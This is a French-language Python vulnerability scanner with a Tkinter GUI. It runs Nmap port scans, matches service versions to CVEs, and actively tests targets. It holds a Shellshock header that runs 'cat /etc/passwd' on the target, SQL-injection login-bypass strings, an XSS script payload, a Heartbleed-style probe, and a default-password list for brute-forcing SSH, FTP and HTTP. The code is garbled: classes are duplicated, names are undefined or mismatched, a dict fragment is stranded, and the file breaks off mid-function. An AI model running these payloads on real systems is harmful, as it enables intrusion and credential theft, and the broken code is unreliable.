#!/usr/bin/env python3
"""
Script d'analyse de vulnérabilités avancé avec interface graphique.
Fonctionnalités:
- Scan de ports (TCP/UDP) avec Nmap
- Détection de services vulnérables
- Tests de vulnérabilités (Heartbleed, Shellshock, SQLi, XSS)
- Brute-force de services (SSH, FTP, HTTP)
- Génération de rapports en différents formats
- Interface graphique moderne
- Système de plugins extensible
"""

# --- Imports système et standard ---
import os
import sys
import csv
import json
import time
import logging
import platform
import threading
import subprocess
import webbrowser
import importlib
import importlib.util
from datetime import datetime
from queue import Queue
from dataclasses import dataclass
from typing import (
    Dict, List, Tuple, Optional, Union, TypeVar, Generic, Any,
    Protocol, Literal, TypedDict, cast, Final
)
from tkinter import StringVar, ttk
import tkinter as tk
from reportlab.platypus import SimpleDocTemplate, Paragraph, Table, Spacer
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.lib.pagesizes import letter

# --- Types personnalisés ---
from typing import NewType

# Type pour file thread-safe
QType = TypeVar('QType', bound=QMessage)
MessageQueue = NewType('MessageQueue', SafeQueue[QMessage])

# Types métier
PortNumber = NewType('PortNumber', int)
ServiceName = NewType('ServiceName', str)
ServiceVersion = NewType('ServiceVersion', str)

# Types pour Nmap
class NmapPortScannerDict(Protocol):
    """Protocol for nmap.PortScannerHostDict"""
    def keys(self) -> list[int]: ...
    def __getitem__(self, key: int) -> dict[str, Any]: ...

class NmapPortScannerHostDict(Protocol):
    """Protocol for nmap scan results for a single host"""
    def all_protocols(self) -> list[str]: ...
    def __getitem__(self, proto: str) -> NmapPortScannerDict: ...

class NmapPortScanner(Protocol):
    """Protocol for nmap.PortScanner"""
    def scan(self, hosts: str, ports: str, arguments: str) -> None: ...
    def __getitem__(self, host: str) -> NmapPortScannerHostDict: ...

@dataclass(frozen=True)
class QMessage:
    """Message typé pour la file de messages."""
    type: Literal["port", "vulnerability"]
    data: Union[QMessageBase, QMessageVuln]

    @staticmethod
    def port(port: int, service: str, version: str) -> "QMessage":
        """Crée un message de type port."""
        data = QMessageBase(port=port, service=service, version=version)
        return QMessage(type="port", data=data)
        
    @staticmethod
    def vulnerability(port: int, service: str, version: str,
                   name: str, description: str, severity: str, cve: List[str]) -> "QMessage":
        """Crée un message de type vulnérabilité."""
        data = QMessageVuln(
            port=port,
            service=service, 
            version=version,
            name=name,
            description=description,
            severity=severity,
            cve=cve
        )
        return QMessage(type="vulnerability", data=data)

QType = TypeVar('QType', bound=QMessage)

class SafeQueue(Queue[QType]):
    """File thread-safe avec type fort."""
    def __init__(self) -> None:
        super().__init__()
        
    def put(self, item: QType, block: bool = True, timeout: Optional[float] = None) -> None:
        super().put(item, block=block, timeout=timeout)
        
    def get(self, block: bool = True, timeout: Optional[float] = None) -> QType:
        return super().get(block=block, timeout=timeout)
        
    def clear(self) -> None:
        """Vide la file."""
        try:
            while True:
                self.get_nowait()
        except:
            pass

class ScannerPlugin(Protocol):
    """Protocol pour les plugins du scanner."""
    def check_vulnerability(
        self,
        target: str,
        port: int,
        service: str,
        version: str,
        results: "ScanResults",
        queue: SafeQueue
    ) -> None:
        """Vérifie les vulnérabilités avec ce plugin."""
        ...
    def vulnerability(port: int, service: str, version: str,
                   vuln_name: str, status: str, severity: str, cve_str: str) -> "QMessage":
        return QMessage(type="vulnerability",
                     data=(port, service, version, vuln_name, status, severity, cve_str))

class SafeQueue(Queue[QMessage]):
    """File thread-safe avec type fort."""
    def put(self, item: QMessage, block: bool = True, timeout: Optional[float] = None) -> None:
        super().put(item, block=block, timeout=timeout)
        
    def get(self, block: bool = True, timeout: Optional[float] = None) -> QMessage:
        return super().get(block=block, timeout=timeout)
        
    def clear(self) -> None:
        """Vide la file."""
        try:
            while True:
                self.get_nowait()
        except:
            pass

class PortInfo(TypedDict):
    port: int
    service: str
    version: str

class Vulnerability(TypedDict):
    port: int
    service: str
    name: str
    status: str
    severity: str
    cve: List[str]

class ScanResults(TypedDict):
    target: str
    open_ports: List[Tuple[int, str, str]]  # (port, service, version)
    vulnerabilities: List[Vulnerability]

# Types pour Nmap
class PortScannerResults(Protocol):
    def all_protocols(self) -> List[str]: ...
    def __getitem__(self, key: str) -> Dict[int, Dict[str, Any]]: ...

# --- Imports réseau et sécurité ---
import ssl
import socket
import requests
import nmap  # nécessite: pip install python-nmap

# --- Imports interface graphique ---
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from ttkthemes import ThemedTk  # nécessite: pip install ttkthemes

# --- Imports génération de rapports ---
from reportlab.lib.pagesizes import letter  # nécessite: pip install reportlab
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet

# --- Types personnalisés ---
# Type definitions
QType = TypeVar('QType', bound=QMessage)

class ScanResults(TypedDict):
    target: str
    ports: List[Tuple[int, str, str]]
    vulnerabilities: List[Dict[str, Union[str, int, List[str]]]]
PluginModule = TypeVar('PluginModule')

MessageType = Tuple[str, Union[Tuple[int, str, str], Tuple[int, str, str, str, str, str, str]]]

class SafeQueue(Generic[T]):
    """File d'attente thread-safe avec gestion des types."""
    def __init__(self) -> None:
        self._queue: Queue[T] = Queue()

    def put(self, item: T) -> None:
        """Ajoute un élément à la file."""
        self._queue.put(item)

    def get(self) -> T:
        """Récupère et supprime un élément de la file."""
        return self._queue.get()

    def empty(self) -> bool:
        """Vérifie si la file est vide."""
        return self._queue.empty()

    def clear(self) -> None:
        """Vide la file entièrement."""
        try:
            while True:
                self._queue.get_nowait()
        except:
            pass

    def qsize(self) -> int:
        """Retourne le nombre d'éléments dans la file."""
        return self._queue.qsize()

# --- Types de données ---
from typing import Final, Dict, List, Union, TypedDict, NewType, Any, Protocol
from types import ModuleType

# --- Types personnalisés ---
from typing import NewType

# Types métier
PortNumber = NewType('PortNumber', int)
ServiceName = NewType('ServiceName', str)
ServiceVersion = NewType('ServiceVersion', str)

# Types pour les structures de données
# Types pour la file de messages
@dataclass(frozen=True)
class QMessageBase:
    """Données de base pour les messages."""
    port: int
    service: str 
    version: str

@dataclass(frozen=True)
class QMessageVuln(QMessageBase):
    """Données pour les messages de vulnérabilité."""
    name: str
    description: str
    severity: str
    cve: List[str]

@dataclass(frozen=True)
class QMessage:
    """Message typé pour la file de messages."""
    type: Literal["port", "vulnerability"]
    data: Union[QMessageBase, QMessageVuln]

    @staticmethod
    def port(port: int, service: str, version: str) -> "QMessage":
        """Crée un message de type port."""
        data = QMessageBase(
            port=port,
            service=service, 
            version=version
        )
        return QMessage(type="port", data=data)
        
    @staticmethod  
    def vulnerability(port: int, service: str, version: str,
                   name: str, description: str, severity: str, cve: List[str]) -> "QMessage":
        """Crée un message de type vulnérabilité."""
        data = QMessageVuln(
            port=port,
            service=service, 
            version=version,
            name=name,
            description=description,
            severity=severity,
            cve=cve
        )
        return QMessage(type="vulnerability", data=data)

# Types pour les résultats de scan
class ServiceInfo(TypedDict, total=True):
    """Information sur un service vulnérable connu."""
    versions: List[str]
    cve: List[str]
    severity: str

# Type pour file thread-safe
QMessageType = TypeVar('QMessageType', bound=QMessage)

class SafeQueue(Queue[QMessageType]):
    """File thread-safe avec type fort."""
    
    def put(self, item: QMessageType, block: bool = True, timeout: Optional[float] = None) -> None:
        super().put(item, block=block, timeout=timeout)
        
    def get(self, block: bool = True, timeout: Optional[float] = None) -> QMessageType:
        return super().get(block=block, timeout=timeout)
        
    def clear(self) -> None:
        """Vide la file."""
        try:
            while True:
                self.get_nowait()
        except:
            pass

@dataclass(frozen=True)
class VulnerabilityInfo:
    """Information sur une vulnérabilité."""
    port: int
    service: str
    version: str
    name: str 
    description: str
    severity: str
    cve: List[str]
    
@dataclass(frozen=True)
class ScanResult:
    """Résultat d'un scan complet."""
    target: str
    ports: List[Tuple[int, str, str]]  # (port, service, version)
    vulnerabilities: List[VulnerabilityInfo]

# Base de données des vulnérabilités
known_vulnerabilities = [
    VulnerabilityInfo(
        port=443,
        service='https',
        version='',
        name='Heartbleed',
        description='Vulnérabilité Heartbleed (CVE-2014-0160) dans OpenSSL.',
        severity='Critical',
        cve=['CVE-2014-0160']
    ),
    VulnerabilityInfo(
        port=80,
        service='http',
        version='',  
        name='Shellshock',
        description='Vulnérabilité Shellshock (CVE-2014-6271) dans Bash.',
        severity='Critical',
        cve=['CVE-2014-6271']
    )
]

# Type pour file thread-safe
MessageQueue = NewType('MessageQueue', 'SafeQueue[QMessage]')

# --- Configuration globale ---
request_timeout: Final[int] = 10
default_ports: Final[str] = "1-1000"
log_file: Final[str] = "vulnerability_scan.log"
report_dir: Final[str] = "reports"
plugins_dir: Final[str] = "plugins"

# --- Base de données de vulnérabilités ---
vulnerable_services: Dict[str, ServiceInfo] = {
    "OpenSSH": {
        "versions": ["<7.6", "<7.7"],
        "cve": ["CVE-2018-15473"],
        "severity": "High" 
    },
    "Apache": {
        "versions": ["<2.4.38"],
        "cve": ["CVE-2019-0211"],
        "severity": "High"
    }
}
    },
    "EternalBlue": {
        "ports": [445],
        "test": "test_eternalblue",
        "description": "Vulnérabilité EternalBlue (CVE-2017-0144) dans SMB.",
        "cve": ["CVE-2017-0144"],
        "severity": "Critical"
    },
    "SQL_Injection": {
        "ports": [80, 443, 8080],
        "test": "test_sql_injection",
        "description": "Test d'injection SQL basique.",
        "cve": [],
        "severity": "High"
    },
    "XSS": {
        "ports": [80, 443, 8080],
        "test": "test_xss",
        "description": "Test de vulnérabilité XSS basique.",
        "cve": [],
        "severity": "Medium"
    },
    "Default_Credentials": {
        "ports": [21, 22, 80, 443, 8080],
        "test": "test_default_credentials",
        "description": "Test d'identifiants par défaut (admin:admin, etc.).",
        "cve": [],
        "severity": "Medium"
    }
}

# --- Services vulnérables ---
VULNERABLE_SERVICES = {
    "OpenSSH": {"versions": ["<7.6", "<7.7"], "cve": ["CVE-2018-15473"], "severity": "High"},
    "Apache": {"versions": ["<2.4.38"], "cve": ["CVE-2019-0211"], "severity": "High"},
    "Nginx": {"versions": ["<1.15.6"], "cve": ["CVE-2018-16843"], "severity": "Medium"},
    "MySQL": {"versions": ["<5.7.26"], "cve": ["CVE-2019-2627"], "severity": "High"},
    "FTP": {"versions": ["vsFTPd 2.3.4"], "cve": ["CVE-2011-2523"], "severity": "Critical"}
}

# --- Identifiants par défaut ---
DEFAULT_CREDENTIALS = {
    "admin": ["admin", "password", "1234", "admin123"],
    "root": ["toor", "root", "1234", "password"],
    "user": ["user", "password", "1234"],
    "ftp": ["ftp", "anonymous", "guest"]
}

# --- Logging ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Classe principale de l'application ---
class VulnerabilityScannerApp:
    """Application principale de scan de vulnérabilités."""
    def __init__(self, root: ThemedTk) -> None:
        """Initialise l'application de scan de vulnérabilités."""
        self.root: ThemedTk = root
        self.root.title("Advanced Vulnerability Scanner")
        self.root.geometry("1200x800")
        self.root.set_theme("plastik")
        
        # Variables d'instance typées
        self.queue: SafeQueue = SafeQueue()  # Type inféré de la classe
        self.scan_running: bool = False
        self.plugins: Dict[str, ModuleType] = {}
        
        # Variables d'interface utilisateur
        self.target: tk.StringVar = tk.StringVar()
        self.ports: tk.StringVar = tk.StringVar(value=DEFAULT_PORTS)
        self.scan_method: tk.StringVar = tk.StringVar(value="SYN")
        self.report_format: tk.StringVar = tk.StringVar(value="json")
        self.log_text: Optional[scrolledtext.ScrolledText] = None
        self.results_tree: Optional[ttk.Treeview] = None
        self.report_listbox: Optional[tk.Listbox] = None
        self.plugin_listbox: Optional[tk.Listbox] = None
        self.status_bar: Optional[ttk.Label] = None
        
        # Configuration initiale
        self.setup_ui()
        self.load_plugins()
        
        # Création des répertoires nécessaires
        os.makedirs(REPORT_DIR, exist_ok=True)
        os.makedirs(PLUGINS_DIR, exist_ok=True)

    def setup_ui(self) -> None:
        """Configure l'interface utilisateur avec onglets."""
        # Création du notebook principal
        self.notebook: ttk.Notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Onglet Scan
        self.scan_tab: ttk.Frame = ttk.Frame(self.notebook)
        self.notebook.add(self.scan_tab, text="Scan")
        self.setup_scan_tab()

        # Onglet Rapports
        self.report_tab: ttk.Frame = ttk.Frame(self.notebook)
        self.notebook.add(self.report_tab, text="Rapports")
        self.setup_report_tab()

        # Onglet Plugins
        self.plugin_tab: ttk.Frame = ttk.Frame(self.notebook)
        self.notebook.add(self.plugin_tab, text="Plugins")
        self.setup_plugin_tab()

        # Barre de statut
        self.status_bar = ttk.Label(self.root, text="Prêt", relief=tk.SUNKEN, anchor=tk.W)
        if self.status_bar:
            self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
            
        # S'assurer que tous les widgets ont été correctement initialisés
        assert self.log_text is not None, "Le widget log_text n'a pas été initialisé"
        assert self.results_tree is not None, "Le widget results_tree n'a pas été initialisé"
        assert self.report_listbox is not None, "Le widget report_listbox n'a pas été initialisé"
        assert self.plugin_listbox is not None, "Le widget plugin_listbox n'a pas été initialisé"

    def setup_scan_tab(self):
        """Configure l'onglet de scan."""
        main_frame = ttk.LabelFrame(self.scan_tab, text="Paramètres de scan", padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Cible
        ttk.Label(main_frame, text="Cible (IP/Domaine):").grid(row=0, column=0, sticky=tk.W)
        self.target = tk.StringVar()
        ttk.Entry(main_frame, textvariable=self.target, width=50).grid(row=0, column=1, padx=5, pady=5)

        # Ports
        ttk.Label(main_frame, text="Ports:").grid(row=1, column=0, sticky=tk.W)
        self.ports = tk.StringVar(value=DEFAULT_PORTS)
        ttk.Entry(main_frame, textvariable=self.ports, width=50).grid(row=1, column=1, padx=5, pady=5)

        # Méthode de scan
        ttk.Label(main_frame, text="Méthode de scan:").grid(row=2, column=0, sticky=tk.W)
        self.scan_method = tk.StringVar(value="SYN")
        ttk.Combobox(main_frame, textvariable=self.scan_method, values=["SYN", "TCP", "UDP", "ACK"], width=47).grid(row=2, column=1, padx=5, pady=5)

        # Format de rapport
        ttk.Label(main_frame, text="Format de rapport:").grid(row=3, column=0, sticky=tk.W)
        self.report_format = tk.StringVar(value="json")
        ttk.Combobox(main_frame, textvariable=self.report_format, values=["json", "html", "txt", "csv", "pdf"], width=47).grid(row=3, column=1, padx=5, pady=5)

        # Boutons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=4, column=0, columnspan=2, pady=10)
        ttk.Button(button_frame, text="Lancer le scan", command=self.start_scan_thread).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Arrêter le scan", command=self.stop_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Effacer les logs", command=self.clear_logs).pack(side=tk.LEFT, padx=5)

        # Logs
        log_frame = ttk.LabelFrame(self.scan_tab, text="Logs", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=80, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True)

        # Résultats
        result_frame = ttk.LabelFrame(self.scan_tab, text="Résultats", padding=10)
        result_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.results_tree = ttk.Treeview(result_frame, columns=("Port", "Service", "Version", "Vulnérabilité", "Sévérité", "CVE"), show="headings")
        self.results_tree.heading("Port", text="Port")
        self.results_tree.heading("Service", text="Service")
        self.results_tree.heading("Version", text="Version")
        self.results_tree.heading("Vulnérabilité", text="Vulnérabilité")
        self.results_tree.heading("Sévérité", text="Sévérité")
        self.results_tree.heading("CVE", text="CVE")
        self.results_tree.column("Port", width=60)
        self.results_tree.column("Service", width=120)
        self.results_tree.column("Version", width=100)
        self.results_tree.column("Vulnérabilité", width=200)
        self.results_tree.column("Sévérité", width=80)
        self.results_tree.column("CVE", width=120)
        self.results_tree.pack(fill=tk.BOTH, expand=True)

    def setup_report_tab(self):
        """Configure l'onglet des rapports."""
        frame = ttk.Frame(self.report_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        ttk.Button(frame, text="Ouvrir un rapport", command=self.open_report).pack(pady=10)
        ttk.Button(frame, text="Exporter les logs", command=self.export_logs).pack(pady=10)
        self.report_listbox = tk.Listbox(frame, width=80, height=20)
        self.report_listbox.pack(fill=tk.BOTH, expand=True, pady=10)
        self.refresh_report_list()

    def setup_plugin_tab(self):
        """Configure l'onglet des plugins."""
        frame = ttk.Frame(self.plugin_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        ttk.Button(frame, text="Charger un plugin", command=self.load_plugin).pack(pady=10)
        ttk.Button(frame, text="Recharger les plugins", command=self.load_plugins).pack(pady=10)
        self.plugin_listbox = tk.Listbox(frame, width=80, height=20)
        self.plugin_listbox.pack(fill=tk.BOTH, expand=True, pady=10)
        self.refresh_plugin_list()

    def load_plugins(self):
        """Charge les plugins depuis le dossier PLUGINS_DIR de manière sécurisée."""
        self.plugins = {}
        
        # Vérification du dossier plugins
        if not os.path.exists(PLUGINS_DIR):
            os.makedirs(PLUGINS_DIR)
            logger.info(f"Dossier plugins créé: {PLUGINS_DIR}")
            return

        # Ajout du dossier plugins au path Python
        if PLUGINS_DIR not in sys.path:
            sys.path.append(PLUGINS_DIR)

        for filename in os.listdir(PLUGINS_DIR):
            if not filename.endswith('.py') or filename.startswith('_'):
                continue

            try:
                module_name = filename[:-3]
                spec = importlib.util.spec_from_file_location(
                    module_name, 
                    os.path.join(PLUGINS_DIR, filename)
                )
                if spec is None:
                    logger.error(f"Impossible de charger le plugin {filename}: spec est None")
                    continue

                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)

                # Vérification de l'interface du plugin
                if not hasattr(module, 'register') or not callable(module.register):
                    logger.error(f"Plugin {filename} invalide: fonction register manquante")
                    continue

                # Vérification des autres fonctions requises
                required_functions = ['check_vulnerability']
                missing_functions = [f for f in required_functions if not hasattr(module, f)]
                if missing_functions:
                    logger.error(f"Plugin {filename} invalide: fonctions manquantes: {', '.join(missing_functions)}")
                    continue

                # Enregistrement du plugin
                module.register(self)
                self.plugins[module_name] = module
                logger.info(f"Plugin chargé avec succès: {module_name}")

            except ImportError as e:
                logger.error(f"Erreur d'importation du plugin {filename}: {e}")
            except AttributeError as e:
                logger.error(f"Erreur d'attribut dans le plugin {filename}: {e}")
            except Exception as e:
                logger.error(f"Erreur inattendue lors du chargement du plugin {filename}: {e}")
                if hasattr(e, '__traceback__'):
                    import traceback
                    logger.error(traceback.format_exc())

    def refresh_plugin_list(self) -> None:
        """Met à jour la liste des plugins."""
        if self.plugin_listbox is not None:
            self.plugin_listbox.delete(0, tk.END)
            for name in self.plugins:
                self.plugin_listbox.insert(tk.END, name)

    def refresh_report_list(self) -> None:
        """Met à jour la liste des rapports."""
        if self.report_listbox is not None:
            self.report_listbox.delete(0, tk.END)
            for filename in os.listdir(REPORT_DIR):
                self.report_listbox.insert(tk.END, filename)

    def log(self, message: str, level: str = "info") -> None:
        """Ajoute un message aux logs."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Log dans l'interface graphique
        if self.log_text is not None:
            self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
            self.log_text.see(tk.END)
            
        # Log dans le fichier
        if level == "error":
            logger.error(message)
        else:
            logger.info(message)

    def clear_logs(self) -> None:
        """Efface les logs."""
        if self.log_text is not None:
            self.log_text.delete(1.0, tk.END)

    def start_scan_thread(self):
        """Lance le scan dans un thread séparé."""
        if self.scan_running:
            messagebox.showwarning("Attention", "Un scan est déjà en cours !")
            return
        self.scan_running = True
        self.queue.clear()
        threading.Thread(target=self.run_scan, daemon=True).start()
        self.log("Scan démarré en arrière-plan.")

    def stop_scan(self):
        """Arrête le scan en cours."""
        self.scan_running = False
        self.log("Scan arrêté par l'utilisateur.")

    def run_scan(self) -> None:
        """Lance le scan de vulnérabilités."""        
        target = self.target.get() if hasattr(self.target, "get") else ""
        if not target:
            self.log("Erreur: Veuillez entrer une cible.", level="error")
            messagebox.showerror("Erreur", "Veuillez entrer une cible.")
            self.scan_running = False
            return

        if self.results_tree is None:
            self.log("Widget résultats non initialisé", level="error")
            return

        self.log(f"[*] Début du scan pour {target}...")
        self.results_tree.delete(*self.results_tree.get_children())
        results: ScanResults = {
            "target": target,
            "open_ports": [],
            "vulnerabilities": []
        }

        try:
            # Récupérer les valeurs des widgets
            ports = self.ports.get() if hasattr(self.ports, "get") else DEFAULT_PORTS
            method = self.scan_method.get() if hasattr(self.scan_method, "get") else "SYN"
            
            nmap_results = scan_ports(target, ports, method)
            
            for proto in nmap_results.all_protocols():
                for port in nmap_results[proto]:                        
                    if not self.scan_running:
                        self.log("Scan arrêté par l'utilisateur.")
                        return
                        
                    port_info = nmap_results[proto][port]
                    service = str(port_info.get("name", ""))
                    version = str(port_info.get("version", ""))
                    
                    results["open_ports"].append((port, service, version))
                    self.queue.put(QMessage.port(port, service, version))
                    self.check_vulnerabilities(target, port, service, version, results)

            # Génération du rapport
            report_format = (self.report_format.get() if hasattr(self.report_format, "get") else "json")
            if report_format not in ("json", "html", "txt", "csv", "pdf"):
                report_format = "json"  # Format par défaut si invalide
                
            report_file = generate_report(results, report_format)
            self.log(f"[+] Rapport généré: {report_file}")
            self.refresh_report_list()
            messagebox.showinfo("Succès", f"Scan terminé. Rapport: {report_file}")

        except Exception as e:
            self.log(f"[-] Erreur lors du scan: {e}", level="error")
            messagebox.showerror("Erreur", f"Erreur lors du scan: {e}")

        self.scan_running = False
        if self.status_bar is not None:
            self.status_bar.config(text="Scan terminé")

    def check_vulnerabilities(self, target: str, port: int, service: str, version: str, results: ScanResults) -> None:
        """Vérifie les vulnérabilités pour un port/service donné."""
        # Vérifie les vulnérabilités connues
        for vuln_name, vuln_data in KNOWN_VULNERABILITIES.items():
            if port in vuln_data["ports"]:
                test_func = globals().get(vuln_data["test"])
                if test_func:
                    is_vuln, status = test_func(target, port)
                    if is_vuln:
                        results["vulnerabilities"].append({
                            "name": vuln_name,
                            "status": status,
                            "port": port,
                            "service": service,
                            "severity": vuln_data["severity"],
                            "cve": vuln_data["cve"]
                        })
                        msg = QMessage.vulnerability(
            port=port,
            service=service,
            version=version,
            vuln_name=vuln_name,
            status=status,
            severity=vuln_data["severity"],
            cve_str=", ".join(vuln_data["cve"])
        )
        self.queue.put(msg)

        # Vérifie les versions vulnérables des services
        for svc_name, svc_data in VULNERABLE_SERVICES.items():
            if svc_name.lower() in service.lower():
                for v in svc_data["versions"]:
                    if version and v in version:
                        results["vulnerabilities"].append({
                            "name": f"Version vulnérable de {svc_name}",
                            "status": f"Version {version} vulnérable",
                            "port": port,
                            "service": service,
                            "severity": svc_data["severity"],
                            "cve": svc_data["cve"]
                        })
                        msg = QMessage.vulnerability(
                            port=port,
                            service=service,
                            version=version,
                            vuln_name=f"Version vulnérable de {svc_name}",
                            status=f"Version {version} vulnérable",
                            severity=svc_data["severity"],
                            cve_str=", ".join(svc_data["cve"])
                        )
                        self.queue.put(msg)
                        
        # Vérifie les identifiants par défaut
        if service.lower() in ["ssh", "ftp", "http", "https"]:
            is_vuln, status = test_default_credentials(target, port, service)
            if is_vuln:
                results["vulnerabilities"].append({
                    "name": "Default_Credentials",
                    "status": status,
                    "port": port,
                    "service": service,
                    "severity": "Medium",
                    "cve": []
                })
                self.queue.put(QMessage.vulnerability(
                    port, service, version,
                    "Default_Credentials", status, "Medium", ""
                ))

        # Exécute les plugins
        for plugin in self.plugins.values():
            if hasattr(plugin, "check_vulnerability"):
                plugin.check_vulnerability(target, port, service, version, results, self.queue)

    def process_queue(self) -> None:
        """Traite les éléments de la file d'attente."""
        if self.results_tree is None:
            return
            
        try:
            while not self.queue.empty():
                message = self.queue.get()
                
                if message.type == "port":
                    port, service, version = message.data
                    self.results_tree.insert(
                        "", tk.END,
                        values=(str(port), service, version, "Aucune", "", "")
                    )
                    
                elif message.type == "vulnerability":
                    port, service, version, vuln_name, status, severity, cve = message.data
                    self.results_tree.insert(
                        "", tk.END,
                        values=(str(port), service, version, f"{vuln_name}: {status}", severity, cve)
                    )
        except Exception as e:
            self.log(f"Erreur lors du traitement de la file: {e}", level="error")
        finally:
            self.root.after(100, self.process_queue)

    def open_report(self) -> None:
        """Ouvre un rapport existant."""
        if self.report_listbox is None:
            self.log("Widget de liste des rapports non initialisé", level="error")
            return
            
        selection = self.report_listbox.curselection()
        if selection:
            filename = self.report_listbox.get(selection[0])
            filepath = os.path.join(REPORT_DIR, filename)
            try:
                if platform.system() == "Windows":
                    os.startfile(filepath)
                else:
                    webbrowser.open(f"file://{filepath}")
            except Exception as e:
                self.log(f"Erreur lors de l'ouverture du rapport: {e}", level="error")
                messagebox.showerror("Erreur", f"Impossible d'ouvrir le rapport: {e}")

    def export_logs(self) -> None:
        """Exporte les logs vers un fichier."""
        if self.log_text is None:
            self.log("Widget de logs non initialisé", level="error")
            return
            
        try:
            log_content = self.log_text.get(1.0, tk.END)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_filename = f"logs/scan_log_{timestamp}.txt"
            os.makedirs("logs", exist_ok=True)
            
            with open(log_filename, "w", encoding='utf-8') as f:
                f.write(log_content)
                
            self.log(f"Logs exportés vers {log_filename}")
            messagebox.showinfo("Succès", f"Logs exportés vers {log_filename}")
        except Exception as e:
            self.log(f"Erreur lors de l'exportation des logs: {e}", level="error")
            messagebox.showerror("Erreur", f"Impossible d'exporter les logs: {e}")

    def load_plugin(self) -> None:
        """Charge un plugin depuis un fichier."""
        file = filedialog.askopenfilename(
            initialdir=PLUGINS_DIR,
            title="Charger un plugin",
            filetypes=[("Fichiers Python", "*.py")]
        )
        if not file:
            return
            
        try:
            module_name = os.path.basename(file)[:-3]
            spec = importlib.util.spec_from_file_location(module_name, file)
            
            if spec is None or spec.loader is None:
                self.log(f"Le fichier {file} n'est pas un module Python valide", level="error")
                return
                
            module = importlib.util.module_from_spec(spec)
            if module is None:
                self.log(f"Impossible de créer le module pour {file}", level="error")
                return
                
            spec.loader.exec_module(module)
            
            if hasattr(module, "register"):
                module.register(self)
                self.plugins[module_name] = module
                self.refresh_plugin_list()
                self.log(f"Plugin chargé: {module_name}")
            else:
                self.log(f"Le fichier {file} n'est pas un plugin valide.", level="error")
        except Exception as e:
            self.log(f"Erreur de chargement du plugin {file}: {e}", level="error")

# --- Fonctions de scan et tests ---
from typing import Protocol, Any

class PortScannerResults(Protocol):
    def all_protocols(self) -> list[str]: ...
    def __getitem__(self, key: str) -> dict[int, dict[str, Any]]: ...

def scan_ports(target: str, ports: str = DEFAULT_PORTS, method: str = "SYN") -> PortScannerResults:
    """Scan des ports avec Nmap.
    
    Args:
        target: L'hôte à scanner
        ports: Les ports à scanner (ex: "20-25,80,443")
        method: La méthode de scan Nmap (ex: "SYN", "TCP", etc.)
        
    Returns:
        Un objet PortScannerResults contenant les résultats du scan
        
    Raises:
        Exception: Si une erreur survient pendant le scan
    """
    nm = nmap.PortScanner()
    try:
        logger.info(f"Scan de {target} (ports: {ports}, méthode: {method})...")
        if method not in {"SYN", "TCP", "UDP", "ACK", "FIN", "NULL"}:
            method = "SYN"  # Méthode par défaut si invalide
        nm.scan(hosts=target, ports=ports, arguments=f"-s{method} -sV --open")
        return nm
    except Exception as e:
        logger.error(f"Erreur Nmap: {e}")
        raise

def test_heartbleed(target: str, port: int = 443) -> Tuple[bool, str]:
    """Test Heartbleed."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(REQUEST_TIMEOUT)
        sock.connect((target, port))
        ssock = ssl.SSLSocket(sock)
        ssock.send(b"\x18\x03\x01\x00\x03\x01\x40\x00")
        response = ssock.recv(1024)
        ssock.close()
        if len(response) > 3:
            return True, "Vulnérable à Heartbleed !"
    except Exception as e:
        logger.error(f"Erreur Heartbleed: {e}")
    return False, "Non vulnérable."

def test_shellshock(target: str, port: int = 80) -> Tuple[bool, str]:
    """Test Shellshock."""
    url = f"http://{target}:{port}/cgi-bin/test"
    headers = {"User-Agent": "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"}
    try:
        r = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        if "root:" in r.text:
            return True, "Vulnérable à Shellshock !"
    except Exception as e:
        logger.error(f"Erreur Shellshock: {e}")
    return False, "Non vulnérable."

def test_sql_injection(target: str, port: int = 80) -> Tuple[bool, str]:
    """Test d'injection SQL basique."""
    url = f"http://{target}:{port}/login"
    payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--"]
    for payload in payloads:
        try:
            data = {"username": payload, "password": payload}
            r = requests.post(url, data=data, timeout=REQUEST_TIMEOUT)
            if "error" not in r.text.lower():
                return True, f"Vulnérabilité SQL détectée (payload: {payload})"
        except Exception as e:
            logger.error(f"Erreur SQLi: {e}")
    return False, "Aucune vulnérabilité SQL détectée."

def test_xss(target: str, port: int = 80) -> Tuple[bool, str]:
    """Test XSS basique."""
    url = f"http://{target}:{port}/search"
    payload = "<script>alert('XSS')</script>"
    try:
        r = requests.get(url, params={"q": payload}, timeout=REQUEST_TIMEOUT)
        if payload in r.text:
            return True, "Vulnérabilité XSS détectée !"
    except Exception as e:
        logger.error(f"Erreur XSS: {e}")
    return False, "Aucune vulnérabilité XSS détectée."

def test_default_credentials(target: str, port: int, service: str) -> Tuple[bool, str]:
    """Test des identifiants par défaut."""
    if service not in ["ssh", "ftp", "http", "https"]:
        return False, "Service non supporté."
    for user, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            try:
                if service == "ssh":
